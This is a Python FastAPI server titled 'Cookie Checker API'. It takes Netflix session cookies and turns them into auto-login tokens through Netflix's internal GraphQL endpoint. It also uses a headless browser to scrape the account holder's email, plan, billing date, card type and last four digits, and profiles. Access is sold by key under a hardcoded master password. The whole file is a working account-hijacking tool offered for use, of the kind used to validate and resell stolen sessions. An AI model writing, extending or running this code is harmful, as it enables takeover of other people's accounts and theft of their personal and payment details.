from fastapi import FastAPI, HTTPException, UploadFile, File, Depends, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Optional
import json
from datetime import datetime
import httpx
import asyncio
import logging
import secrets
import os
import re
from dotenv import load_dotenv

load_dotenv()

# Ensure Playwright can find its browsers
_pw_browsers = os.getenv("PLAYWRIGHT_BROWSERS_PATH")
if _pw_browsers:
    os.environ["PLAYWRIGHT_BROWSERS_PATH"] = _pw_browsers

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

app = FastAPI(title="Cookie Checker API", version="1.0.0")

# Master Key Configuration
MASTER_KEY = "PritongTinola*3030"

# In-memory key storage (in production, use a database)
# Maps key -> user_name
valid_keys = {}

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic Models
class Cookie(BaseModel):
    name: str
    value: str
    domain: Optional[str] = None
    path: Optional[str] = "/"
    expires: Optional[str] = None
    secure: Optional[bool] = False
    httponly: Optional[bool] = False
    samesite: Optional[str] = None

class CookieCheckRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"  # netscape, json, auto

class CookieCheckResponse(BaseModel):
    success: bool
    cookies: List[Cookie]
    count: int
    parsed_at: str
    errors: Optional[List[str]] = None

class NetflixTokenRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"
    use_playwright: Optional[bool] = False

class NetflixTokenResponse(BaseModel):
    success: bool
    nftoken: Optional[str] = None
    error: Optional[str] = None
    cookies: List[Cookie] = []
    cookie_count: int = 0

# Authentication Models
class VerifyKeyRequest(BaseModel):
    key: str

class LoginResponse(BaseModel):
    success: bool
    message: str
    is_master: bool = False
    user_name: Optional[str] = None

class GenerateKeyRequest(BaseModel):
    master_key: str
    user_name: str
    custom_key: str

class GenerateKeyResponse(BaseModel):
    success: bool
    key: Optional[str] = None
    user_name: Optional[str] = None
    message: str

class DeleteKeyRequest(BaseModel):
    master_key: str
    key_to_delete: str

class DeleteKeyResponse(BaseModel):
    success: bool
    message: str

class ListKeysResponse(BaseModel):
    success: bool
    keys: List[dict]
    count: int

class NetflixAccountInfo(BaseModel):
    success: bool
    email: Optional[str] = None
    country: Optional[str] = None
    plan: Optional[str] = None
    subscription_status: Optional[str] = None
    profiles: Optional[List[dict]] = None
    billing_date: Optional[str] = None
    account_created_date: Optional[str] = None
    payment_method: Optional[str] = None
    streaming_quality: Optional[str] = None
    error: Optional[str] = None

# Cookie Parsing Functions
def parse_netscape_cookies(text: str) -> tuple[List[Cookie], List[str]]:
    """Parse Netscape format cookies (from browser dev tools)"""
    cookies = []
    errors = []
    
    for line in text.strip().split('\n'):
        line = line.strip()
        if line.startswith('#') or not line:
            continue
        
        try:
            parts = line.split('\t')
            if len(parts) >= 7:
                cookie = Cookie(
                    name=parts[5],
                    value=parts[6],
                    domain=parts[0],
                    path=parts[2],
                    secure=parts[3].lower() == 'true',
                    expires=parts[4] if parts[4] != '0' else None,
                    httponly=parts[8].lower() == 'true' if len(parts) > 8 else False
                )
                cookies.append(cookie)
            elif '=' in line:
                # Fallback for simple key=value pairs
                for pair in line.split(';'):
                    pair = pair.strip()
                    if '=' in pair:
                        k, _, v = pair.partition('=')
                        cookies.append(Cookie(name=k.strip(), value=v.strip()))
        except Exception as e:
            errors.append(f"Failed to parse line: {line}. Error: {str(e)}")
    
    return cookies, errors

def parse_json_cookies(text: str) -> tuple[List[Cookie], List[str]]:
    """Parse JSON format cookies"""
    cookies = []
    errors = []
    
    try:
        data = json.loads(text)
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    cookie = Cookie(
                        name=item.get('name', ''),
                        value=item.get('value', ''),
                        domain=item.get('domain'),
                        path=item.get('path', '/'),
                        expires=item.get('expires'),
                        secure=item.get('secure', False),
                        httponly=item.get('httpOnly', False),
                        samesite=item.get('sameSite')
                    )
                    cookies.append(cookie)
        elif isinstance(data, dict):
            for k, v in data.items():
                cookies.append(Cookie(name=k, value=str(v)))
    except json.JSONDecodeError as e:
        errors.append(f"Invalid JSON: {str(e)}")
    
    return cookies, errors

def parse_cookies_auto(text: str) -> tuple[List[Cookie], List[str]]:
    """Auto-detect and parse cookies"""
    text = text.strip()
    
    if text.startswith('[') or text.startswith('{'):
        cookies, errors = parse_json_cookies(text)
        if cookies:
            return cookies, errors
    
    return parse_netscape_cookies(text)

# Netflix Token Generation Functions

logger = logging.getLogger(__name__)

def _build_cookie_header(cookies: dict) -> str:
    return '; '.join([f"{k}={v}" for k, v in cookies.items()])

async def _discover_shakti_build(http_client: httpx.AsyncClient, headers: dict) -> list[str]:
    """Discover active shakti build id from Netflix pages and return fallback candidates."""
    candidates: list[str] = []
    try:
        resp = await http_client.get("https://www.netflix.com/browse", headers=headers)
        if resp.status_code == 200:
            html = resp.text
            matches = re.findall(r"/api/shakti/([^/\"']+)/", html)
            for m in matches:
                if m and m not in candidates:
                    candidates.append(m)
    except Exception:
        # Silent fallback to known static build ids.
        pass

    static_fallbacks = ["v1e9e8b93"]
    for build in static_fallbacks:
        if build not in candidates:
            candidates.append(build)

    return candidates

async def generate_nftoken(cookies: dict) -> tuple[bool, Optional[str], Optional[str]]:
    """Generate Netflix auto-login token from cookies"""
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        norm[k.lower()] = v

    netflix_id = norm.get('NetflixId') or norm.get('netflixid')
    secure_id = norm.get('SecureNetflixId') or norm.get('securenetflixid')

    if not netflix_id or not secure_id:
        return False, None, "Missing required cookies (NetflixId, SecureNetflixId)"

    cookie_str = _build_cookie_header(cookies)

    payload = {
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {
            "persistedQuery": {
                "version": 102,
                "id": "76e97129-f4b5-41a0-a73c-12e674896849"
            }
        }
    }

    nft_headers = {
        'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
        'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://www.netflix.com',
        'Referer': 'https://www.netflix.com/',
        'Cookie': cookie_str
    }

    graphql_endpoints = [
        'https://android13.prod.ftl.netflix.com/graphql',
        'https://ios.prod.ftl.netflix.com/graphql',
        'https://www.netflix.com/graphql'
    ]

    try:
        async with httpx.AsyncClient(timeout=30.0, follow_redirects=True, http2=False) as http_client:
            last_error: Optional[str] = None
            for endpoint in graphql_endpoints:
                resp = await http_client.post(
                    endpoint,
                    headers=nft_headers,
                    json=payload
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                        token = data['data']['createAutoLoginToken']
                        return True, token, None
                    if 'errors' in data:
                        last_error = f"API Error: {json.dumps(data.get('errors', []))}"
                        continue
                    last_error = "Unexpected response"
                    continue

                if resp.status_code == 421:
                    last_error = f"HTTP 421 from {endpoint}"
                    continue

                last_error = f"HTTP {resp.status_code} from {endpoint}"

            return False, None, last_error or "Failed to generate token"
    except Exception as e:
        return False, None, str(e)

async def get_netflix_account_info(cookies: dict) -> tuple[bool, Optional[dict], Optional[str]]:
    """Extract Netflix account info via Playwright using the confirmed reactContext structure."""
    norm = {}
    for k, v in cookies.items():
        norm[k] = v
        norm[k.lower()] = v

    if not (norm.get('NetflixId') or norm.get('netflixid')):
        return False, None, "Missing required cookies (NetflixId, SecureNetflixId)"

    try:
        from playwright.async_api import async_playwright

        captured_profiles: Optional[dict] = None

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            cookie_list = [
                {"name": k, "value": v, "domain": ".netflix.com", "path": "/", "secure": True, "sameSite": "None"}
                for k, v in cookies.items()
            ]
            await context.add_cookies(cookie_list)
            page = await context.new_page()

            # Capture profiles API response
            async def handle_response(response):
                nonlocal captured_profiles
                try:
                    if response.status == 200 and '/profiles' in response.url and 'shakti' in response.url:
                        captured_profiles = await response.json()
                except Exception:
                    pass
            page.on('response', handle_response)

            account_info = {}

            try:
                await page.goto("https://www.netflix.com/browse", timeout=35000)
                await page.wait_for_load_state("networkidle", timeout=20000)
                await asyncio.sleep(2)

                current_url = page.url
                print(f"[DEBUG] URL after browse: {current_url}", flush=True)

                if '/login' in current_url or '/LoginSelection' in current_url:
                    await browser.close()
                    return False, None, "Cookies are expired or invalid — Netflix redirected to login."

                # Extract from models.userInfo.data — confirmed working structure
                ctx = await page.evaluate("""() => {
                    try {
                        const models = window.netflix?.reactContext?.models || {};
                        const ui = models.userInfo?.data || {};
                        const geo = models.geo?.data || {};
                        return JSON.stringify({ userInfo: ui, geo: geo });
                    } catch(e) { return null; }
                }""")

                if ctx:
                    data = json.loads(ctx)
                    ui = data.get('userInfo', {})
                    geo = data.get('geo', {})

                    print(f"[DEBUG] userInfo: {ui}", flush=True)

                    if ui.get('emailAddress'):
                        account_info['email'] = ui['emailAddress']
                    if ui.get('membershipStatus') and ui['membershipStatus'] != 'ANONYMOUS':
                        account_info['subscription_status'] = ui['membershipStatus']
                    if ui.get('countryOfSignup'):
                        account_info['country'] = ui['countryOfSignup']
                    elif geo.get('requestCountry', {}).get('id'):
                        account_info['country'] = geo['requestCountry']['id']
                    if ui.get('memberSince'):
                        ms = ui['memberSince']
                        if isinstance(ms, (int, float)):
                            account_info['account_created_date'] = datetime.utcfromtimestamp(ms / 1000).strftime('%Y-%m-%d')
                        else:
                            account_info['account_created_date'] = str(ms)

                # Use browser's own fetch() to call Shakti — avoids 421 since it's inside the real session
                shakti_data = await page.evaluate("""async () => {
                    try {
                        let build = 'mre';
                        const ctx = window.netflix?.reactContext;
                        if (ctx?.serverDefs?.data?.BUILD_IDENTIFIER) build = ctx.serverDefs.data.BUILD_IDENTIFIER;
                        const scripts = [...document.querySelectorAll('script[src]')];
                        for (const s of scripts) {
                            const m = s.src.match(/\\/api\\/shakti\\/([^/]+)\\//);
                            if (m) { build = m[1]; break; }
                        }
                        const path = JSON.stringify([
                            ['currentAccount', ['planName', 'planType', 'maxStreamingQuality', 'maxUserLimit', 'numAllowedDevices']],
                            ['accountInfo', ['email', 'countryOfSignup', 'membershipStatus', 'createdDate']],
                            ['paymentData', ['nextPaymentDate', 'billingMethod', 'paymentMethods']]
                        ]);
                        const url = `/api/shakti/${build}/pathEvaluator?withSize=true&materialize=true&model=harris&path=${encodeURIComponent(path)}`;
                        const resp = await fetch(url, { credentials: 'include' });
                        if (resp.ok) return await resp.json();
                        return { error: resp.status };
                    } catch(e) { return { error: e.message }; }
                }""")

                print(f"[DEBUG] shakti_data raw: {json.dumps(shakti_data)[:1000]}", flush=True)

                # Falcor response: {jsonGraph:{...}} or {value:{...}, paths:[...]} where value IS the graph
                jg = {}
                if isinstance(shakti_data, dict):
                    jg = (
                        shakti_data.get('jsonGraph') or
                        (shakti_data.get('value') or {}).get('jsonGraph') or
                        shakti_data.get('value') or
                        {}
                    )
                    if isinstance(jg, dict):
                        print(f"[DEBUG] jg keys: {list(jg.keys())}", flush=True)

                def _falcor_val(node):
                    """Extract value from a Falcor {$type:'atom', value:...} or plain value node."""
                    if isinstance(node, dict):
                        return node.get('value')
                    return node

                if isinstance(jg, dict):
                    acc = jg.get('accountInfo', {})
                    if not account_info.get('email'):
                        account_info['email'] = _falcor_val(acc.get('email'))
                    if not account_info.get('country'):
                        account_info['country'] = _falcor_val(acc.get('countryOfSignup')) or account_info.get('country')
                    if not account_info.get('subscription_status'):
                        account_info['subscription_status'] = _falcor_val(acc.get('membershipStatus')) or account_info.get('subscription_status')
                    if not account_info.get('account_created_date'):
                        created = _falcor_val(acc.get('createdDate'))
                        if isinstance(created, (int, float)):
                            account_info['account_created_date'] = datetime.utcfromtimestamp(created / 1000).strftime('%Y-%m-%d')
                        elif created:
                            account_info['account_created_date'] = str(created)

                    curr = jg.get('currentAccount', {})
                    max_streams = _falcor_val(curr.get('maxUserLimit')) or _falcor_val(curr.get('numAllowedDevices'))
                    print(f"[DEBUG] currentAccount: {curr}", flush=True)
                    print(f"[DEBUG] max_streams raw: {max_streams}", flush=True)
                    if max_streams is not None:
                        try:
                            n = int(max_streams)
                            stream_plan_map = {1: "Basic (1 Screen)", 2: "Standard (2 Screens)", 4: "Premium (4 Screens)"}
                            account_info['plan'] = stream_plan_map.get(n, f"{n} Screens")
                            account_info['max_streams'] = n
                        except (ValueError, TypeError):
                            pass
                    if not account_info.get('plan'):
                        account_info['plan'] = _falcor_val(curr.get('planName')) or _falcor_val(curr.get('planType'))
                    if not account_info.get('streaming_quality'):
                        account_info['streaming_quality'] = _falcor_val(curr.get('maxStreamingQuality'))

                    pay = jg.get('paymentData', {})
                    if not account_info.get('billing_date'):
                        np_val = _falcor_val(pay.get('nextPaymentDate'))
                        if isinstance(np_val, (int, float)):
                            np_val = datetime.utcfromtimestamp(np_val / 1000).strftime('%Y-%m-%d')
                        if np_val:
                            account_info['billing_date'] = str(np_val)
                    if not account_info.get('payment_method'):
                        methods = _falcor_val(pay.get('paymentMethods'))
                        if isinstance(methods, list) and methods:
                            m = methods[0]
                            if isinstance(m, dict):
                                last4 = m.get('last4', '')
                                mtype = m.get('type', 'Unknown')
                                account_info['payment_method'] = f"{mtype} ****{last4}" if last4 else mtype

                # Always navigate to /YourAccount — has email, plan info, and billing details
                print(f"[DEBUG] Loading YourAccount page...", flush=True)
                ya_intercepted: list[dict] = []

                async def handle_ya_response(response):
                    try:
                        if response.status == 200 and 'pathEvaluator' in response.url:
                            body = await response.json()
                            ya_intercepted.append(body)
                    except Exception:
                        pass
                page.on('response', handle_ya_response)

                await page.goto("https://www.netflix.com/YourAccount", timeout=30000)
                await page.wait_for_load_state("networkidle", timeout=15000)
                await asyncio.sleep(2)

                # Dump ALL model keys and selected model data from YourAccount reactContext
                ya_ctx = await page.evaluate("""() => {
                    try {
                        const models = window.netflix?.reactContext?.models || {};
                        const allKeys = Object.keys(models);
                        const out = { allModelKeys: allKeys };
                        // Capture every model's data
                        for (const k of allKeys) {
                            try { out[k] = models[k]?.data || null; } catch(e) {}
                        }
                        return JSON.stringify(out);
                    } catch(e) { return null; }
                }""")

                if ya_ctx:
                    ya_data = json.loads(ya_ctx)
                    print(f"[DEBUG] YourAccount model keys: {ya_data.get('allModelKeys', [])}", flush=True)

                    ya_ui = ya_data.get('userInfo') or {}
                    if not account_info.get('email'):
                        account_info['email'] = ya_ui.get('emailAddress')
                    if not account_info.get('country'):
                        account_info['country'] = ya_ui.get('countryOfSignup') or ya_ui.get('currentCountry')

                    # Search every model for plan/streams data
                    PLAN_KEYS = ['planName', 'plan', 'planLabel', 'planType', 'currentPlan', 'subscriptionPlan']
                    STREAM_KEYS = ['maxStreams', 'maxUserLimit', 'numAllowedDevices', 'numScreens', 'concurrentStreams', 'simultaneousStreams']
                    for model_key, model_data in ya_data.items():
                        if model_key in ('allModelKeys',) or not isinstance(model_data, dict):
                            continue
                        for pk in PLAN_KEYS:
                            if model_data.get(pk) and not account_info.get('plan'):
                                account_info['plan'] = str(model_data[pk])
                                print(f"[DEBUG] Plan from model [{model_key}][{pk}]: {account_info['plan']}", flush=True)
                        for sk in STREAM_KEYS:
                            if model_data.get(sk) is not None and not account_info.get('max_streams'):
                                try:
                                    account_info['max_streams'] = int(model_data[sk])
                                    print(f"[DEBUG] Streams from model [{model_key}][{sk}]: {account_info['max_streams']}", flush=True)
                                except (ValueError, TypeError):
                                    pass

                # Also check intercepted pathEvaluator calls made on YourAccount page
                print(f"[DEBUG] YourAccount intercepted {len(ya_intercepted)} pathEvaluator responses", flush=True)
                for resp_data in ya_intercepted:
                    ya_jg = (
                        resp_data.get('jsonGraph') or
                        (resp_data.get('value') or {}).get('jsonGraph') or
                        resp_data.get('value') or {}
                    )
                    print(f"[DEBUG] YourAccount jg keys: {list(ya_jg.keys()) if isinstance(ya_jg, dict) else ya_jg}", flush=True)
                    if isinstance(ya_jg, dict):
                        for pk in ['planName', 'plan', 'planLabel', 'planType']:
                            if ya_jg.get(pk) and not account_info.get('plan'):
                                account_info['plan'] = _falcor_val(ya_jg[pk])
                        for sk in ['maxStreams', 'maxUserLimit', 'numAllowedDevices', 'numScreens']:
                            if ya_jg.get(sk) is not None and not account_info.get('max_streams'):
                                v = _falcor_val(ya_jg[sk])
                                if v is not None:
                                    try:
                                        account_info['max_streams'] = int(v)
                                    except (ValueError, TypeError):
                                        pass

                # DOM scraping fallback for plan on YourAccount page
                if not account_info.get('plan') and not account_info.get('max_streams'):
                    plan_sels = [
                        '[data-uia="plan-label"]', '[data-uia="plan-name"]',
                        '.planLabel', '.plan-label', '.current-plan',
                        '[data-uia="membership-status"]',
                    ]
                    for sel in plan_sels:
                        try:
                            el = await page.query_selector(sel)
                            if el:
                                txt = (await el.inner_text()).strip()
                                if txt:
                                    account_info['plan'] = txt
                                    print(f"[DEBUG] Plan from DOM ({sel}): {txt}", flush=True)
                                    break
                        except Exception:
                            pass

                # Map max_streams to plan name if plan still unknown
                if not account_info.get('plan') and account_info.get('max_streams'):
                    n = account_info['max_streams']
                    stream_plan_map = {1: "Basic (1 Screen)", 2: "Standard (2 Screens)", 4: "Premium (4 Screens)"}
                    account_info['plan'] = stream_plan_map.get(n, f"{n} Screens")

                # Profiles via authenticated browser fetch
                if not captured_profiles:
                    try:
                        resp = await page.goto("https://www.netflix.com/api/shakti/mre/profiles", timeout=15000)
                        if resp and resp.status == 200:
                            captured_profiles = await resp.json()
                    except Exception as pe:
                        print(f"[DEBUG] Profiles error: {pe}", flush=True)

                if isinstance(captured_profiles, dict) and 'profiles' in captured_profiles:
                    account_info['profiles'] = [
                        {'name': pr.get('firstName', 'Unknown'), 'isKids': pr.get('isKids', False), 'guid': pr.get('guid', '')}
                        for pr in captured_profiles['profiles']
                    ]

                print(f"[DEBUG] Final account_info: {account_info}", flush=True)

            except Exception as nav_err:
                print(f"[DEBUG] Navigation error: {nav_err}", flush=True)
            finally:
                await browser.close()

        account_info = {k: v for k, v in account_info.items() if v is not None}

        if account_info:
            return True, account_info, None
        return False, None, "Could not extract account information. Cookies may be expired or invalid."

    except ImportError:
        return False, None, "Playwright is not installed on this server."
    except Exception as e:
        return False, None, f"Playwright error: {str(e)}"

async def get_browser_cookies_with_playwright(cookies_dict: dict) -> tuple[dict, Optional[str]]:
    """Use Playwright to get full cookie header from Netflix.com"""
    try:
        from playwright.async_api import async_playwright
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
            context = await browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )

            # Convert cookies dict to the format Playwright expects
            cookie_list = [{
                "name": name,
                "value": value,
                "domain": ".netflix.com",
                "path": "/",
                "secure": True,
                "sameSite": "None"
            } for name, value in cookies_dict.items()]
            
            await context.add_cookies(cookie_list)
            page = await context.new_page()

            try:
                await page.goto("https://www.netflix.com/browse", timeout=25000)
                await page.wait_for_load_state("domcontentloaded", timeout=10000)
                await asyncio.sleep(2)
            except Exception as e:
                logger.warning(f"Navigation error: {e}")

            # Get all cookies from the browser context
            all_cookies = await context.cookies()
            netflix_cookies = {c['name']: c['value'] for c in all_cookies if 'netflix' in c.get('domain', '').lower()}
            
            await browser.close()
            
            return netflix_cookies, None
    except Exception as e:
        return {}, str(e)

# Authentication Functions

async def verify_api_key(x_api_key: Optional[str] = Header(None)) -> str:
    """Dependency to verify API key on protected endpoints"""
    if not x_api_key:
        raise HTTPException(status_code=401, detail="API key required")
    
    if x_api_key == MASTER_KEY or x_api_key in valid_keys:
        return x_api_key
    
    raise HTTPException(status_code=403, detail="Invalid API key")

# API Endpoints

@app.get("/")
async def root():
    """Health check endpoint"""
    return {
        "status": "running",
        "message": "Cookie Checker API",
        "version": "1.0.0"
    }

# Authentication Endpoints

@app.post("/api/auth/login", response_model=LoginResponse)
async def login(request: VerifyKeyRequest):
    """Login endpoint - verify key and return success"""
    if request.key == MASTER_KEY:
        return LoginResponse(
            success=True,
            message="Login successful",
            is_master=True,
            user_name="Admin"
        )
    elif request.key in valid_keys:
        user_name = valid_keys[request.key]
        return LoginResponse(
            success=True,
            message="Login successful",
            is_master=False,
            user_name=user_name
        )
    else:
        raise HTTPException(status_code=403, detail="Invalid key")

@app.post("/api/auth/generate-key", response_model=GenerateKeyResponse)
async def generate_key(request: GenerateKeyRequest):
    """Create a new login key with custom key and user name (master key required)"""
    if request.master_key != MASTER_KEY:
        raise HTTPException(status_code=403, detail="Invalid master key")
    
    if not request.custom_key or not request.custom_key.strip():
        raise HTTPException(status_code=400, detail="Custom key cannot be empty")
    
    # Check if key already exists
    if request.custom_key in valid_keys:
        raise HTTPException(status_code=400, detail="This key already exists")
    
    # Store the custom key with the user name
    valid_keys[request.custom_key] = request.user_name
    
    return GenerateKeyResponse(
        success=True,
        key=request.custom_key,
        user_name=request.user_name,
        message=f"Login key created successfully for {request.user_name}"
    )

@app.post("/api/auth/delete-key", response_model=DeleteKeyResponse)
async def delete_key(request: DeleteKeyRequest):
    """Delete a login key (master key required)"""
    if request.master_key != MASTER_KEY:
        raise HTTPException(status_code=403, detail="Invalid master key")
    
    if request.key_to_delete not in valid_keys:
        raise HTTPException(status_code=400, detail="Key not found")
    
    user_name = valid_keys[request.key_to_delete]
    del valid_keys[request.key_to_delete]
    
    return DeleteKeyResponse(
        success=True,
        message=f"Login key for {user_name} has been deleted"
    )

@app.post("/api/auth/list-keys", response_model=ListKeysResponse)
async def list_keys(request: VerifyKeyRequest):
    """List all login keys (master key required)"""
    if request.key != MASTER_KEY:
        raise HTTPException(status_code=403, detail="Invalid master key")
    
    keys_list = [
        {"key": key, "user_name": user_name}
        for key, user_name in valid_keys.items()
    ]
    
    return ListKeysResponse(
        success=True,
        keys=keys_list,
        count=len(keys_list)
    )

@app.post("/api/check-cookies", response_model=CookieCheckResponse)
async def check_cookies(
    request: CookieCheckRequest,
    api_key: str = Depends(verify_api_key)
):
    """
    Parse and extract cookies from provided text.
    Supports Netscape format, JSON format, or auto-detection.
    """
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
    
    format_type = request.format_type.lower()
    cookies = []
    errors = []
    
    try:
        if format_type == "netscape":
            cookies, errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'"
            )
        
        return CookieCheckResponse(
            success=len(cookies) > 0,
            cookies=cookies,
            count=len(cookies),
            parsed_at=datetime.utcnow().isoformat(),
            errors=errors if errors else None
        )
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error parsing cookies: {str(e)}")

@app.post("/api/upload-cookies")
async def upload_cookies(
    file: UploadFile = File(...),
    api_key: str = Depends(verify_api_key)
):
    """
    Upload a file containing cookies (text or JSON).
    Returns parsed cookies.
    """
    try:
        content = await file.read()
        text = content.decode('utf-8')
        
        cookies, errors = parse_cookies_auto(text)
        
        return {
            "success": len(cookies) > 0,
            "filename": file.filename,
            "cookies": cookies,
            "count": len(cookies),
            "parsed_at": datetime.utcnow().isoformat(),
            "errors": errors if errors else None
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error processing file: {str(e)}")

@app.get("/api/stats")
async def get_stats():
    """Get API statistics"""
    return {
        "status": "running",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": [
            "POST /api/check-cookies",
            "POST /api/upload-cookies",
            "POST /api/generate-netflix-token",
            "GET /api/stats"
        ]
    }

@app.post("/api/generate-netflix-token", response_model=NetflixTokenResponse)
async def generate_netflix_token(
    request: NetflixTokenRequest,
    api_key: str = Depends(verify_api_key)
):
    """
    Parse cookies and generate Netflix auto-login token.
    If use_playwright is True, will use Playwright to get full cookie header.
    """
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
    
    # Parse the input cookies
    format_type = request.format_type.lower()
    cookies, parse_errors = [], []
    
    try:
        if format_type == "netscape":
            cookies, parse_errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, parse_errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, parse_errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'"
            )
        
        if not cookies:
            return NetflixTokenResponse(
                success=False,
                error="No cookies parsed from input"
            )
        
        # Convert cookies list to dict for processing
        cookies_dict = {cookie.name: cookie.value for cookie in cookies}
        
        # Use Playwright if requested or if only partial cookies provided
        if request.use_playwright:
            logger.info("Using Playwright to get full cookie header...")
            cookies_dict, playwright_error = await get_browser_cookies_with_playwright(cookies_dict)
            if playwright_error:
                logger.warning(f"Playwright error: {playwright_error}")
                # Continue anyway with the original cookies
        
        # Generate Netflix token
        success, token, error = await generate_nftoken(cookies_dict)
        
        return NetflixTokenResponse(
            success=success,
            nftoken=token,
            error=error,
            cookies=cookies,
            cookie_count=len(cookies)
        )
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error generating token: {str(e)}")

@app.post("/api/get-account-info", response_model=NetflixAccountInfo)
async def get_account_info(
    request: CookieCheckRequest,
    api_key: str = Depends(verify_api_key)
):
    """
    Extract Netflix account information from cookies.
    Returns email, plan, country, subscription status, and profiles.
    """
    if not request.cookies_text or not request.cookies_text.strip():
        raise HTTPException(status_code=400, detail="cookies_text cannot be empty")
    
    # Parse the input cookies
    format_type = request.format_type.lower()
    cookies, parse_errors = [], []
    
    try:
        if format_type == "netscape":
            cookies, parse_errors = parse_netscape_cookies(request.cookies_text)
        elif format_type == "json":
            cookies, parse_errors = parse_json_cookies(request.cookies_text)
        elif format_type == "auto":
            cookies, parse_errors = parse_cookies_auto(request.cookies_text)
        else:
            raise HTTPException(
                status_code=400,
                detail="Invalid format_type. Must be 'netscape', 'json', or 'auto'"
            )
        
        if not cookies:
            return NetflixAccountInfo(
                success=False,
                error="No cookies parsed from input"
            )
        
        # Convert cookies list to dict for processing
        cookies_dict = {cookie.name: cookie.value for cookie in cookies}
        
        # Get account information
        success, account_info, error = await get_netflix_account_info(cookies_dict)
        
        if success and account_info:
            return NetflixAccountInfo(
                success=True,
                email=account_info.get('email'),
                country=account_info.get('country'),
                plan=account_info.get('plan'),
                subscription_status=account_info.get('subscription_status'),
                billing_date=account_info.get('billing_date'),
                account_created_date=account_info.get('account_created_date'),
                payment_method=account_info.get('payment_method'),
                streaming_quality=account_info.get('streaming_quality'),
                profiles=account_info.get('profiles')
            )
        else:
            return NetflixAccountInfo(
                success=False,
                error=error or "Failed to extract account information"
            )
    
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error extracting account info: {str(e)}")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
